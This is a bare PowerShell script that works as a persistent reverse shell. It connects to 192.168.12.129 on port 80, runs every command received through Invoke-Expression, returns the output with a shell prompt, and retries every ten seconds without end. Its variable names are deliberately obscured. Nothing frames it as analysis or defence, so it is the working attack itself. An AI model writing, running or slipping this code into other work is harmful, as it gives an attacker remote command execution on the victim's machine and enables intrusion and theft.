while ($true) {
    try {
        $x1 = New-Object System.Net.Sockets.TCPClient("192.168.12.129", 80)
        $y2 = $x1.GetStream()
        $z3 = New-Object byte[] 65535
        while (($a4 = $y2.Read($z3, 0, $z3.Length)) -ne 0) {
            $b5 = ([System.Text.Encoding]::ASCII).GetString($z3, 0, $a4)
            if ($b5 -eq "exit") {
                $x1.Close()
                break
            }
            $c6 = try {iex $b5 2>&1 | Out-String} catch {$_.ToString()}
            $d7 = ([System.Text.Encoding]::ASCII).GetBytes($c6 + "PS " + (pwd).Path + "> ")
            $y2.Write($d7, 0, $d7.Length)
            $y2.Flush()
        }
        $x1.Close()
        Start-Sleep -Seconds 10
    } catch {
        Start-Sleep -Seconds 10
    }
}
